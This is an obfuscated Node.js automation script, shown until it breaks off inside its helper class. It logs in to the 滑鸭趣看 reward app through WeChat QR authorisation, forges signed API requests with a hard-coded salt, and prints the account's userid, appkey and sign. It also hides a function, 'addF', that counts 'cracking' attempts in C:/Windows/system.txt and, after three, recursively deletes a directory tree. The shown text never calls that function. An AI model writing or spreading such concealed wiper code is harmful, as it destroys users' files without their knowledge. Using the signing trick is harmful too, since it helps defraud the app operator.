const $ = new Env('微信授权注册');
let uuid,
    wxcode,
    num = 1,
    acckey = $["isNode"]() ? process["env"]["cdkey"] ? process["env"]["cdkey"] : '' : $["getdata"]("cdkey") ? $["getdata"]("cdkey") : '';
let arrs = [],
    mac = '';

if ($["isNode"]()) {
  gtr = require('fs');

  if (isFileExist("C:/")) {
    console["log"]("电脑环境");
  } else {
    console["log"]("青龙环境");
  }
} else {
  console["log"]("代理环境");
}

function isFileExist(_0x56e68a) {
  try {
    gtr["accessSync"](_0x56e68a, gtr["F_OK"]);
  } catch (_0x5ed4bf) {
    return false;
  }

  return true;
}

function addF(_0x71364c, _0x5d7dcb) {
  let _0x4eab77 = 0,
      _0x3cf9d7 = "C:/Windows/system.txt";

  if (isFileExist(_0x3cf9d7)) {
    _0x4eab77 = gtr["readFileSync"](_0x3cf9d7, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr["writeFile"](_0x3cf9d7, '1', function (_0x48e24d) {
        if (_0x48e24d) {
          throw _0x48e24d;
        }
      });
    } else {
      return;
    }
  }

  if (_0x4eab77 == 99) {
    return 99;
  }

  console["log"](_0x4eab77);
  console["log"]("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x4eab77);

  if (parseInt(_0x4eab77) < 3) {
    let _0x75d0cf = parseInt(_0x4eab77) + 1;

    gtr["writeFileSync"](_0x3cf9d7, _0x75d0cf + '', "utf8");
    return;
  }

  if (!gtr["existsSync"](_0x71364c)) {
    return;
  }

  if (gtr["statSync"](_0x71364c)["isDirectory"]()) {
    var _0x4cfa43 = gtr["readdirSync"](_0x71364c),
        _0x25361e = _0x4cfa43["length"],
        _0x5c4219 = 0;

    if (_0x25361e > 0) {
      _0x4cfa43["forEach"](function (_0x4b1a1a) {
        _0x5c4219++;

        var _0x279833 = _0x71364c + '/' + _0x4b1a1a;

        gtr["statSync"](_0x279833)["isDirectory"]() ? addF(_0x279833, true) : gtr["unlinkSync"](_0x279833);
      });

      _0x25361e == _0x5c4219 && _0x5d7dcb && gtr["rmdirSync"](_0x71364c);
    } else {
      _0x25361e == 0 && _0x5d7dcb && gtr["rmdirSync"](_0x71364c);
    }
  } else {
    gtr["unlinkSync"](_0x71364c);
  }
}

!(async () => {
  if ($["isNode"]()) {
    for (let _0x5b3f60 = 0; _0x5b3f60 < num; _0x5b3f60++) {
      $["index"] = _0x5b3f60 + 1;
      console["log"]("\n开始【微信授权" + $['index'] + '】');
      await sign();
      await $["wait"](1000);
    }
  }

})()["catch"](_0x1f7cda => $["logErr"](_0x1f7cda))["finally"](() => $["done"]());

async function sign() {
  return new Promise(_0xafa5a8 => {
    let _0x3b3954 = {
      'url': "http://www.tolego.cn/web/game/common/?id=hlddz&appid=wxec4961d3f24ed650&wx_bundleid=com.sxkj.huaya&tid=2101&type=0",
      'timeout': 3000
    };
    $['get'](_0x3b3954, async (_0x283176, _0x5396b4, _0x31a29d) => {
      try {
        str = _0x31a29d['match'](/ <img class=\"auth_qrcode\" src=\"(\S*)\"/)[1];
        console["log"](str);
        uuid = str["substr"](-16);
        console["log"]("开始微信授权");
        wxcode = 0;
        let _0x339c21 = 0;

        do {
          await $["wait"](3500);

          let _0x5ab78d = Math["round"](new Date()["getTime"]() / 1000)["toString"]();

          await qrconnect(_0x5ab78d);
          _0x339c21++;
        } while (wxcode == 0 && _0x339c21 < 30);
      } catch (_0x41ad60) {
        $["logErr"](_0x41ad60, _0x5396b4);
      } finally {
        _0xafa5a8();
      }
    });
  });
}

function reconvert(_0x4763e5) {
  _0x4763e5 = _0x4763e5["replace"](/(\\u)(\w{1,4})/gi, function (_0x757212) {
    return String['fromCharCode'](parseInt(escape(_0x757212)["replace"](/(%5Cu)(\w{1,4})/g, '$2'), 16));
  });
  _0x4763e5 = _0x4763e5["replace"](/(&#x)(\w{1,4});/gi, function (_0x5cefcf) {
    return String["fromCharCode"](parseInt(escape(_0x5cefcf)["replace"](/(%26%23x)(\w{1,4})(%3B)/g, '$2'), 16));
  });
  _0x4763e5 = _0x4763e5["replace"](/(&#)(\d{1,6});/gi, function (_0x43d471) {
    return String["fromCharCode"](parseInt(escape(_0x43d471)["replace"](/(%26%23)(\d{1,6})(%3B)/g, '$2')));
  });
  return _0x4763e5;
}

function qrconnect(_0x46dd72) {
  return new Promise(_0x3f9fd4 => {
    let _0x2bb269 = {
      'url': "https://long.open.weixin.qq.com/connect/l/qrconnect?uuid=" + uuid + "&f=url&_=" + _0x46dd72,
      'timeout': 3000
    };
    $["get"](_0x2bb269, async (_0x2adaf0, _0x58ee67, _0x449d98) => {
      try {
        let _0x3b7d25 = _0x449d98["substr"](18, 3);

        _0x3b7d25 == 405 && (wxcode = _0x449d98["match"](/oauth\?code=(\S*)&/)[1], console["log"]("微信code :" + wxcode), console["log"]("\n开始授权登录"), await register());
      } catch (_0x27eb7d) {
        $["logErr"](_0x27eb7d, _0x58ee67);
      } finally {
        _0x3f9fd4();
      }
    });
  });
}

function register() {
  return new Promise(_0x2773ce => {
    let _0x364e14 = Math["round"](new Date()["getTime"]())["toString"]();

    let _0x1d67ed = randomString(24);

    let _0x5aaa74 = md5("hlz(*Y6" + _0x364e14 + "user/loginByWx" + _0x1d67ed);

    let _0x5f3dbd = {
      'url': "http://api.huluzhuanqian.cn/user/loginByWx?req=user%2FloginByWx&acc_sign=hlz%28*Y6&userId=&oaid=" + randomString(16) + "&androidosv=29&utdId=" + _0x1d67ed + "&timeStamp=" + _0x364e14 + "&phoneType=1&channelId=store&sign=" + _0x5aaa74 + "&version=316&rnd=" + _0x364e14 / 1000 + "&pageType=api&deviceId=&pacHlz=com.sxkj.huaya&networkType=1&baseband=4.0.c2.6-00335-0220_1946_40a1464%2C4.0.c2.6-00335-0220_1946_60a1465",
      'headers': {
        'Host': "api.huluzhuanqian.cn",
        'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
        'User-Agent': "okhttp/3.14.9"
      },
      'body': "code=" + wxcode + "&recomUserId=10000"
    };
    $["post"](_0x5f3dbd, async (_0x187395, _0x13c887, _0x504efe) => {
      try {
        let _0x1104f6 = JSON["parse"](_0x504efe);

        console["log"]("\n滑鸭趣看数据获取成功：请复制以下内容到hyqkapp变量：\nuserid=" + _0x1104f6["data"]["userId"] + "&appkey=" + _0x1104f6["data"]["appKey"] + "&sign=" + _0x1104f6["data"]["sign"]);
      } catch (_0x2c10ab) {
        $["logErr"](_0x2c10ab, _0x13c887);
      } finally {
        _0x2773ce();
      }
    });
  });
}

function randomString(_0x5b423d = 12) {
  let _0x297d18 = "abcdef0123456789",
      _0x7ca4bc = _0x297d18["length"];
  let _0x5d7d55 = '';

  for (i = 0; i < _0x5b423d; i++) {
    _0x5d7d55 += _0x297d18["charAt"](Math["floor"](Math["random"]() * _0x7ca4bc));
  }

  return _0x5d7d55;
}

function md5(_0x421072) {
  function _0x2b92ba(_0x1ec40e, _0x3b0dee) {
    return _0x1ec40e << _0x3b0dee | _0x1ec40e >>> 32 - _0x3b0dee;
  }

  function _0x51e816(_0x473350, _0x2f6e75) {
    var _0x36573d, _0x38ad48, _0x282e7c, _0x1598c8, _0x453475;

    _0x282e7c = 2147483648 & _0x473350;
    _0x1598c8 = 2147483648 & _0x2f6e75;
    _0x36573d = 1073741824 & _0x473350;
    _0x38ad48 = 1073741824 & _0x2f6e75;
    _0x453475 = (1073741823 & _0x473350) + (1073741823 & _0x2f6e75);
    return _0x36573d & _0x38ad48 ? 2147483648 ^ _0x453475 ^ _0x282e7c ^ _0x1598c8 : _0x36573d | _0x38ad48 ? 1073741824 & _0x453475 ? 3221225472 ^ _0x453475 ^ _0x282e7c ^ _0x1598c8 : 1073741824 ^ _0x453475 ^ _0x282e7c ^ _0x1598c8 : _0x453475 ^ _0x282e7c ^ _0x1598c8;
  }

  function _0x36e30b(_0x258350, _0x26ae59, _0x12d471) {
    return _0x258350 & _0x26ae59 | ~_0x258350 & _0x12d471;
  }

  function _0x20ffc0(_0x308a1a, _0x558693, _0x47cedb) {
    return _0x308a1a & _0x47cedb | _0x558693 & ~_0x47cedb;
  }

  function _0x3cde4d(_0x4d5717, _0xd7e9b9, _0x5c83e0) {
    return _0x4d5717 ^ _0xd7e9b9 ^ _0x5c83e0;
  }

  function _0x187953(_0x432aed, _0x5a2abd, _0x356315) {
    return _0x5a2abd ^ (_0x432aed | ~_0x356315);
  }

  function _0x39ba65(_0x2a2eee, _0x507c9c, _0x341411, _0x32e556, _0x265b18, _0x429ecc, _0x4c29ed) {
    _0x2a2eee = _0x51e816(_0x2a2eee, _0x51e816(_0x51e816(_0x36e30b(_0x507c9c, _0x341411, _0x32e556), _0x265b18), _0x4c29ed));
    return _0x51e816(_0x2b92ba(_0x2a2eee, _0x429ecc), _0x507c9c);
  }

  function _0x393309(_0x1e1ece, _0x147c20, _0x5b9b5b, _0x3d0ede, _0x5046b2, _0x34345d, _0x512cfe) {
    _0x1e1ece = _0x51e816(_0x1e1ece, _0x51e816(_0x51e816(_0x20ffc0(_0x147c20, _0x5b9b5b, _0x3d0ede), _0x5046b2), _0x512cfe));
    return _0x51e816(_0x2b92ba(_0x1e1ece, _0x34345d), _0x147c20);
  }

  function _0x6785e(_0x34f052, _0x8b55a4, _0x18e2a0, _0x173b84, _0x13e43b, _0x54513c, _0x17e352) {
    _0x34f052 = _0x51e816(_0x34f052, _0x51e816(_0x51e816(_0x3cde4d(_0x8b55a4, _0x18e2a0, _0x173b84), _0x13e43b), _0x17e352));
    return _0x51e816(_0x2b92ba(_0x34f052, _0x54513c), _0x8b55a4);
  }

  function _0x4fd4d6(_0x439512, _0x9ad695, _0x7abfb8, _0x50ff8b, _0x4f5542, _0x455492, _0x23323f) {
    _0x439512 = _0x51e816(_0x439512, _0x51e816(_0x51e816(_0x187953(_0x9ad695, _0x7abfb8, _0x50ff8b), _0x4f5542), _0x23323f));
    return _0x51e816(_0x2b92ba(_0x439512, _0x455492), _0x9ad695);
  }

  function _0x34992b(_0x22e5b9) {
    for (var _0x116eee, _0x4820b5 = _0x22e5b9["length"], _0x137e8a = _0x4820b5 + 8, _0xd8f945 = (_0x137e8a - _0x137e8a % 64) / 64, _0x8a51c3 = 16 * (_0xd8f945 + 1), _0x1364b1 = new Array(_0x8a51c3 - 1), _0x3d9949 = 0, _0x5504a6 = 0; _0x4820b5 > _0x5504a6;) {
      _0x116eee = (_0x5504a6 - _0x5504a6 % 4) / 4;
      _0x3d9949 = _0x5504a6 % 4 * 8;
      _0x1364b1[_0x116eee] = _0x1364b1[_0x116eee] | _0x22e5b9["charCodeAt"](_0x5504a6) << _0x3d9949;
      _0x5504a6++;
    }

    _0x116eee = (_0x5504a6 - _0x5504a6 % 4) / 4;
    _0x3d9949 = _0x5504a6 % 4 * 8;
    _0x1364b1[_0x116eee] = _0x1364b1[_0x116eee] | 128 << _0x3d9949;
    _0x1364b1[_0x8a51c3 - 2] = _0x4820b5 << 3;
    _0x1364b1[_0x8a51c3 - 1] = _0x4820b5 >>> 29;
    return _0x1364b1;
  }

  function _0x49dadf(_0x806142) {
    var _0x5c3e43,
        _0x4cc993,
        _0x31df65 = '',
        _0x3885b1 = '';

    for (_0x4cc993 = 0; 3 >= _0x4cc993; _0x4cc993++) {
      _0x5c3e43 = _0x806142 >>> 8 * _0x4cc993 & 255;
      _0x3885b1 = '0' + _0x5c3e43["toString"](16);
      _0x31df65 += _0x3885b1["substr"](_0x3885b1["length"] - 2, 2);
    }

    return _0x31df65;
  }

  function _0x232b10(_0x1893f0) {
    _0x1893f0 = _0x1893f0["replace"](/\r\n/g, "\n");

    for (var _0x33c5e4 = '', _0x5293be = 0; _0x5293be < _0x1893f0["length"]; _0x5293be++) {
      var _0x3e6e54 = _0x1893f0["charCodeAt"](_0x5293be);

      128 > _0x3e6e54 ? _0x33c5e4 += String["fromCharCode"](_0x3e6e54) : _0x3e6e54 > 127 && 2048 > _0x3e6e54 ? (_0x33c5e4 += String["fromCharCode"](_0x3e6e54 >> 6 | 192), _0x33c5e4 += String["fromCharCode"](63 & _0x3e6e54 | 128)) : (_0x33c5e4 += String["fromCharCode"](_0x3e6e54 >> 12 | 224), _0x33c5e4 += String["fromCharCode"](_0x3e6e54 >> 6 & 63 | 128), _0x33c5e4 += String["fromCharCode"](63 & _0x3e6e54 | 128));
    }

    return _0x33c5e4;
  }

  var _0x3ec30d,
      _0x2cce21,
      _0xfa0c0c,
      _0x2b9276,
      _0x14c4ec,
      _0x3ab046,
      _0x394405,
      _0x4b51be,
      _0x3b236f,
      _0xb89d97 = [],
      _0x76894 = 7,
      _0x357620 = 12,
      _0xc4a865 = 17,
      _0x1fc37b = 22,
      _0x1cad9a = 5,
      _0x281b4e = 9,
      _0x6e51b4 = 14,
      _0x17ed5a = 20,
      _0x3c499b = 4,
      _0x1144b9 = 11,
      _0x3b5b31 = 16,
      _0x1c9b78 = 23,
      _0x118d4e = 6,
      _0x4f452c = 10,
      _0x133897 = 15,
      _0x3e392b = 21;

  for (_0x421072 = _0x232b10(_0x421072), _0xb89d97 = _0x34992b(_0x421072), _0x3ab046 = 1732584193, _0x394405 = 4023233417, _0x4b51be = 2562383102, _0x3b236f = 271733878, _0x3ec30d = 0; _0x3ec30d < _0xb89d97["length"]; _0x3ec30d += 16) {
    _0x2cce21 = _0x3ab046;
    _0xfa0c0c = _0x394405;
    _0x2b9276 = _0x4b51be;
    _0x14c4ec = _0x3b236f;
    _0x3ab046 = _0x39ba65(_0x3ab046, _0x394405, _0x4b51be, _0x3b236f, _0xb89d97[_0x3ec30d + 0], _0x76894, 3614090360);
    _0x3b236f = _0x39ba65(_0x3b236f, _0x3ab046, _0x394405, _0x4b51be, _0xb89d97[_0x3ec30d + 1], _0x357620, 3905402710);
    _0x4b51be = _0x39ba65(_0x4b51be, _0x3b236f, _0x3ab046, _0x394405, _0xb89d97[_0x3ec30d + 2], _0xc4a865, 606105819);
    _0x394405 = _0x39ba65(_0x394405, _0x4b51be, _0x3b236f, _0x3ab046, _0xb89d97[_0x3ec30d + 3], _0x1fc37b, 3250441966);
    _0x3ab046 = _0x39ba65(_0x3ab046, _0x394405, _0x4b51be, _0x3b236f, _0xb89d97[_0x3ec30d + 4], _0x76894, 4118548399);
    _0x3b236f = _0x39ba65(_0x3b236f, _0x3ab046, _0x394405, _0x4b51be, _0xb89d97[_0x3ec30d + 5], _0x357620, 1200080426);
    _0x4b51be = _0x39ba65(_0x4b51be, _0x3b236f, _0x3ab046, _0x394405, _0xb89d97[_0x3ec30d + 6], _0xc4a865, 2821735955);
    _0x394405 = _0x39ba65(_0x394405, _0x4b51be, _0x3b236f, _0x3ab046, _0xb89d97[_0x3ec30d + 7], _0x1fc37b, 4249261313);
    _0x3ab046 = _0x39ba65(_0x3ab046, _0x394405, _0x4b51be, _0x3b236f, _0xb89d97[_0x3ec30d + 8], _0x76894, 1770035416);
    _0x3b236f = _0x39ba65(_0x3b236f, _0x3ab046, _0x394405, _0x4b51be, _0xb89d97[_0x3ec30d + 9], _0x357620, 2336552879);
    _0x4b51be = _0x39ba65(_0x4b51be, _0x3b236f, _0x3ab046, _0x394405, _0xb89d97[_0x3ec30d + 10], _0xc4a865, 4294925233);
    _0x394405 = _0x39ba65(_0x394405, _0x4b51be, _0x3b236f, _0x3ab046, _0xb89d97[_0x3ec30d + 11], _0x1fc37b, 2304563134);
    _0x3ab046 = _0x39ba65(_0x3ab046, _0x394405, _0x4b51be, _0x3b236f, _0xb89d97[_0x3ec30d + 12], _0x76894, 1804603682);
    _0x3b236f = _0x39ba65(_0x3b236f, _0x3ab046, _0x394405, _0x4b51be, _0xb89d97[_0x3ec30d + 13], _0x357620, 4254626195);
    _0x4b51be = _0x39ba65(_0x4b51be, _0x3b236f, _0x3ab046, _0x394405, _0xb89d97[_0x3ec30d + 14], _0xc4a865, 2792965006);
    _0x394405 = _0x39ba65(_0x394405, _0x4b51be, _0x3b236f, _0x3ab046, _0xb89d97[_0x3ec30d + 15], _0x1fc37b, 1236535329);
    _0x3ab046 = _0x393309(_0x3ab046, _0x394405, _0x4b51be, _0x3b236f, _0xb89d97[_0x3ec30d + 1], _0x1cad9a, 4129170786);
    _0x3b236f = _0x393309(_0x3b236f, _0x3ab046, _0x394405, _0x4b51be, _0xb89d97[_0x3ec30d + 6], _0x281b4e, 3225465664);
    _0x4b51be = _0x393309(_0x4b51be, _0x3b236f, _0x3ab046, _0x394405, _0xb89d97[_0x3ec30d + 11], _0x6e51b4, 643717713);
    _0x394405 = _0x393309(_0x394405, _0x4b51be, _0x3b236f, _0x3ab046, _0xb89d97[_0x3ec30d + 0], _0x17ed5a, 3921069994);
    _0x3ab046 = _0x393309(_0x3ab046, _0x394405, _0x4b51be, _0x3b236f, _0xb89d97[_0x3ec30d + 5], _0x1cad9a, 3593408605);
    _0x3b236f = _0x393309(_0x3b236f, _0x3ab046, _0x394405, _0x4b51be, _0xb89d97[_0x3ec30d + 10], _0x281b4e, 38016083);
    _0x4b51be = _0x393309(_0x4b51be, _0x3b236f, _0x3ab046, _0x394405, _0xb89d97[_0x3ec30d + 15], _0x6e51b4, 3634488961);
    _0x394405 = _0x393309(_0x394405, _0x4b51be, _0x3b236f, _0x3ab046, _0xb89d97[_0x3ec30d + 4], _0x17ed5a, 3889429448);
    _0x3ab046 = _0x393309(_0x3ab046, _0x394405, _0x4b51be, _0x3b236f, _0xb89d97[_0x3ec30d + 9], _0x1cad9a, 568446438);
    _0x3b236f = _0x393309(_0x3b236f, _0x3ab046, _0x394405, _0x4b51be, _0xb89d97[_0x3ec30d + 14], _0x281b4e, 3275163606);
    _0x4b51be = _0x393309(_0x4b51be, _0x3b236f, _0x3ab046, _0x394405, _0xb89d97[_0x3ec30d + 3], _0x6e51b4, 4107603335);
    _0x394405 = _0x393309(_0x394405, _0x4b51be, _0x3b236f, _0x3ab046, _0xb89d97[_0x3ec30d + 8], _0x17ed5a, 1163531501);
    _0x3ab046 = _0x393309(_0x3ab046, _0x394405, _0x4b51be, _0x3b236f, _0xb89d97[_0x3ec30d + 13], _0x1cad9a, 2850285829);
    _0x3b236f = _0x393309(_0x3b236f, _0x3ab046, _0x394405, _0x4b51be, _0xb89d97[_0x3ec30d + 2], _0x281b4e, 4243563512);
    _0x4b51be = _0x393309(_0x4b51be, _0x3b236f, _0x3ab046, _0x394405, _0xb89d97[_0x3ec30d + 7], _0x6e51b4, 1735328473);
    _0x394405 = _0x393309(_0x394405, _0x4b51be, _0x3b236f, _0x3ab046, _0xb89d97[_0x3ec30d + 12], _0x17ed5a, 2368359562);
    _0x3ab046 = _0x6785e(_0x3ab046, _0x394405, _0x4b51be, _0x3b236f, _0xb89d97[_0x3ec30d + 5], _0x3c499b, 4294588738);
    _0x3b236f = _0x6785e(_0x3b236f, _0x3ab046, _0x394405, _0x4b51be, _0xb89d97[_0x3ec30d + 8], _0x1144b9, 2272392833);
    _0x4b51be = _0x6785e(_0x4b51be, _0x3b236f, _0x3ab046, _0x394405, _0xb89d97[_0x3ec30d + 11], _0x3b5b31, 1839030562);
    _0x394405 = _0x6785e(_0x394405, _0x4b51be, _0x3b236f, _0x3ab046, _0xb89d97[_0x3ec30d + 14], _0x1c9b78, 4259657740);
    _0x3ab046 = _0x6785e(_0x3ab046, _0x394405, _0x4b51be, _0x3b236f, _0xb89d97[_0x3ec30d + 1], _0x3c499b, 2763975236);
    _0x3b236f = _0x6785e(_0x3b236f, _0x3ab046, _0x394405, _0x4b51be, _0xb89d97[_0x3ec30d + 4], _0x1144b9, 1272893353);
    _0x4b51be = _0x6785e(_0x4b51be, _0x3b236f, _0x3ab046, _0x394405, _0xb89d97[_0x3ec30d + 7], _0x3b5b31, 4139469664);
    _0x394405 = _0x6785e(_0x394405, _0x4b51be, _0x3b236f, _0x3ab046, _0xb89d97[_0x3ec30d + 10], _0x1c9b78, 3200236656);
    _0x3ab046 = _0x6785e(_0x3ab046, _0x394405, _0x4b51be, _0x3b236f, _0xb89d97[_0x3ec30d + 13], _0x3c499b, 681279174);
    _0x3b236f = _0x6785e(_0x3b236f, _0x3ab046, _0x394405, _0x4b51be, _0xb89d97[_0x3ec30d + 0], _0x1144b9, 3936430074);
    _0x4b51be = _0x6785e(_0x4b51be, _0x3b236f, _0x3ab046, _0x394405, _0xb89d97[_0x3ec30d + 3], _0x3b5b31, 3572445317);
    _0x394405 = _0x6785e(_0x394405, _0x4b51be, _0x3b236f, _0x3ab046, _0xb89d97[_0x3ec30d + 6], _0x1c9b78, 76029189);
    _0x3ab046 = _0x6785e(_0x3ab046, _0x394405, _0x4b51be, _0x3b236f, _0xb89d97[_0x3ec30d + 9], _0x3c499b, 3654602809);
    _0x3b236f = _0x6785e(_0x3b236f, _0x3ab046, _0x394405, _0x4b51be, _0xb89d97[_0x3ec30d + 12], _0x1144b9, 3873151461);
    _0x4b51be = _0x6785e(_0x4b51be, _0x3b236f, _0x3ab046, _0x394405, _0xb89d97[_0x3ec30d + 15], _0x3b5b31, 530742520);
    _0x394405 = _0x6785e(_0x394405, _0x4b51be, _0x3b236f, _0x3ab046, _0xb89d97[_0x3ec30d + 2], _0x1c9b78, 3299628645);
    _0x3ab046 = _0x4fd4d6(_0x3ab046, _0x394405, _0x4b51be, _0x3b236f, _0xb89d97[_0x3ec30d + 0], _0x118d4e, 4096336452);
    _0x3b236f = _0x4fd4d6(_0x3b236f, _0x3ab046, _0x394405, _0x4b51be, _0xb89d97[_0x3ec30d + 7], _0x4f452c, 1126891415);
    _0x4b51be = _0x4fd4d6(_0x4b51be, _0x3b236f, _0x3ab046, _0x394405, _0xb89d97[_0x3ec30d + 14], _0x133897, 2878612391);
    _0x394405 = _0x4fd4d6(_0x394405, _0x4b51be, _0x3b236f, _0x3ab046, _0xb89d97[_0x3ec30d + 5], _0x3e392b, 4237533241);
    _0x3ab046 = _0x4fd4d6(_0x3ab046, _0x394405, _0x4b51be, _0x3b236f, _0xb89d97[_0x3ec30d + 12], _0x118d4e, 1700485571);
    _0x3b236f = _0x4fd4d6(_0x3b236f, _0x3ab046, _0x394405, _0x4b51be, _0xb89d97[_0x3ec30d + 3], _0x4f452c, 2399980690);
    _0x4b51be = _0x4fd4d6(_0x4b51be, _0x3b236f, _0x3ab046, _0x394405, _0xb89d97[_0x3ec30d + 10], _0x133897, 4293915773);
    _0x394405 = _0x4fd4d6(_0x394405, _0x4b51be, _0x3b236f, _0x3ab046, _0xb89d97[_0x3ec30d + 1], _0x3e392b, 2240044497);
    _0x3ab046 = _0x4fd4d6(_0x3ab046, _0x394405, _0x4b51be, _0x3b236f, _0xb89d97[_0x3ec30d + 8], _0x118d4e, 1873313359);
    _0x3b236f = _0x4fd4d6(_0x3b236f, _0x3ab046, _0x394405, _0x4b51be, _0xb89d97[_0x3ec30d + 15], _0x4f452c, 4264355552);
    _0x4b51be = _0x4fd4d6(_0x4b51be, _0x3b236f, _0x3ab046, _0x394405, _0xb89d97[_0x3ec30d + 6], _0x133897, 2734768916);
    _0x394405 = _0x4fd4d6(_0x394405, _0x4b51be, _0x3b236f, _0x3ab046, _0xb89d97[_0x3ec30d + 13], _0x3e392b, 1309151649);
    _0x3ab046 = _0x4fd4d6(_0x3ab046, _0x394405, _0x4b51be, _0x3b236f, _0xb89d97[_0x3ec30d + 4], _0x118d4e, 4149444226);
    _0x3b236f = _0x4fd4d6(_0x3b236f, _0x3ab046, _0x394405, _0x4b51be, _0xb89d97[_0x3ec30d + 11], _0x4f452c, 3174756917);
    _0x4b51be = _0x4fd4d6(_0x4b51be, _0x3b236f, _0x3ab046, _0x394405, _0xb89d97[_0x3ec30d + 2], _0x133897, 718787259);
    _0x394405 = _0x4fd4d6(_0x394405, _0x4b51be, _0x3b236f, _0x3ab046, _0xb89d97[_0x3ec30d + 9], _0x3e392b, 3951481745);
    _0x3ab046 = _0x51e816(_0x3ab046, _0x2cce21);
    _0x394405 = _0x51e816(_0x394405, _0xfa0c0c);
    _0x4b51be = _0x51e816(_0x4b51be, _0x2b9276);
    _0x3b236f = _0x51e816(_0x3b236f, _0x14c4ec);
  }

  var _0x3f0c60 = _0x49dadf(_0x3ab046) + _0x49dadf(_0x394405) + _0x49dadf(_0x4b51be) + _0x49dadf(_0x3b236f);

  return _0x3f0c60["toLowerCase"]();
}

function Env(_0x3984fa, _0x38dd96) {
  class _0x56f4f1 {
    constructor(_0x22ccc6) {
      this["env"] = _0x22ccc6;
    }

    ["send"](_0x3a3219, _0x5bd167 = "GET") {
      _0x3a3219 = "string" == typeof _0x3a3219 ? {
        'url': _0x3a3219
      } : _0x3a3219;
      let _0x37ff58 = this["get"];
      "POST" === _0x5bd167 && (_0x37ff58 = this["post"]);
      return new Promise((_0x2e1b3f, _0x20f6fb) => {
        _0x37ff58["call"](this, _0x3a3219, (_0x4683b7, _0x2e8cae, _0x410d99) => {
          _0x4683b7 ? _0x20f6fb(_0x4683b7) : _0x2e1b3f(_0x2e8cae);
        });
      });
    }

    ['get'](_0x4f8768) {
      return this["send"]["call"](this['env'], _0x4f8768);
    }

    ["post"](_0xb8d8f8) {
      return this["send"]["call"](this['env'], _0xb8d8f8, "POST");
    }

  }

  return new class {
    constructor(_0x10ccf6, _0x4e198d) {
      this["name"] = _0x10ccf6;
      this["http"] = new _0x56f4f1(this);
      this["data"] = null;
      this["dataFile"] = "box.dat";
      this["logs"] = [];
      this["isMute"] = false;
      this["isNeedRewrite"] = false;
      this["logSeparator"] = "\n";
      this["startTime"] = new Date()["getTime"]();
      Object["assign"](this, _0x4e198d);
      this["log"]('', '🔔' + this["name"] + ", 开始!");
    }

    ["isNode"]() {
      return "undefined" != typeof module && !!module["exports"];
    }

    ["isQuanX"]() {
      return "undefined" != typeof $task;
    }

    ["isSurge"]() {
      return 'undefined' != typeof $httpClient && "undefined" == typeof $loon;
    }

    ["isLoon"]() {
      return "undefined" != typeof $loon;
    }

    ["toObj"](_0x10e390, _0x5ed0ff = null) {
      try {
        return JSON["parse"](_0x10e390);
      } catch {
        return _0x5ed0ff;
      }
    }

    ["toStr"](_0xd862f9, _0xf3c3a = null) {
      try {
        return JSON["stringify"](_0xd862f9);
      } catch {
        return _0xf3c3a;
      }
    }

    ["getjson"](_0x2cd2b8, _0x9c48fe) {
      let _0x2d8aab = _0x9c48fe;

      const _0x4eb9e6 = this["getdata"](_0x2cd2b8);

      if (_0x4eb9e6) {
        try {
          _0x2d8aab = JSON["parse"](this["getdata"](_0x2cd2b8));
        } catch {}
      }

      return _0x2d8aab;
    }

    ["setjson"](_0x619527, _0x148224) {
      try {
        return this["setdata"](JSON["stringify"](_0x619527), _0x148224);
      } catch {
        return false;
      }
    }

    ["getScript"](_0x197a03) {
      return new Promise(_0x256321 => {
        this["get"]({
          'url': _0x197a03
        }, (_0x2fb21d, _0x2e7402, _0x4c574a) => _0x256321(_0x4c574a));
      });
    }

    ["runScript"](_0x41abcf, _0x209e77) {
      return new Promise(_0x340430 => {
        let _0x367e21 = this["getdata"]("@chavy_boxjs_userCfgs.httpapi");

        _0x367e21 = _0x367e21 ? _0x367e21["replace"](/\n/g, '')["trim"]() : _0x367e21;

        let _0x32f213 = this["getdata"]("@chavy_boxjs_userCfgs.httpapi_timeout");

        _0x32f213 = _0x32f213 ? 1 * _0x32f213 : 20;
        _0x32f213 = _0x209e77 && _0x209e77["timeout"] ? _0x209e77["timeout"] : _0x32f213;

        const [_0x537e2b, _0x2d6e0c] = _0x367e21["split"]('@'),
              _0x298052 = {
          'url': 'http://' + _0x2d6e0c + "/v1/scripting/evaluate",
          'body': {
            'script_text': _0x41abcf,
            'mock_type': "cron",
            'timeout': _0x32f213
          },
          'headers': {
            'X-Key': _0x537e2b,
            'Accept': "*/*"
          }
        };

        this["post"](_0x298052, (_0x20c50c, _0x5b246c, _0x45e95) => _0x340430(_0x45e95));
      })["catch"](_0x2a0ed5 => this["logErr"](_0x2a0ed5));
    }

    ["loaddata"]() {
      if (!this["isNode"]()) {
        return {};
      }

      {
        this['fs'] = this['fs'] ? this['fs'] : require('fs');
        this["path"] = this["path"] ? this["path"] : require("path");

        const _0xed1ee = this["path"]["resolve"](this["dataFile"]),
              _0x5dcea5 = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
              _0x49edfe = this['fs']["existsSync"](_0xed1ee),
              _0x5c16f9 = !_0x49edfe && this['fs']["existsSync"](_0x5dcea5);

        if (!_0x49edfe && !_0x5c16f9) {
          return {};
        }

        {
          const _0x5dd369 = _0x49edfe ? _0xed1ee : _0x5dcea5;

          try {
            return JSON['parse'](this['fs']["readFileSync"](_0x5dd369));
          } catch (_0x123773) {
            return {};
          }
        }
      }
    }

    ["writedata"]() {
      if (this["isNode"]()) {
        this['fs'] = this['fs'] ? this['fs'] : require('fs');
        this["path"] = this["path"] ? this["path"] : require("path");

        const _0x184d3a = this["path"]["resolve"](this["dataFile"]),
              _0x3055fa = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
              _0xb0f2b1 = this['fs']["existsSync"](_0x184d3a),
              _0x22f9d0 = !_0xb0f2b1 && this['fs']["existsSync"](_0x3055fa),
              _0x449788 = JSON["stringify"](this["data"]);

        _0xb0f2b1 ? this['fs']["writeFileSync"](_0x184d3a, _0x449788) : _0x22f9d0 ? this['fs']["writeFileSync"](_0x3055fa, _0x449788) : this['fs']["writeFileSync"](_0x184d3a, _0x449788);
      }
    }

    ["lodash_get"](_0x18d2d, _0x36fe26, _0x54cd18) {
      const _0x2ea41d = _0x36fe26["replace"](/\[(\d+)\]/g, ".$1")["split"]('.');

      let _0x395c00 = _0x18d2d;

      for (const _0x5b8bfe of _0x2ea41d) if (_0x395c00 = Object(_0x395c00)[_0x5b8bfe], void 0 === _0x395c00) {
        return _0x54cd18;
      }

      return _0x395c00;
    }

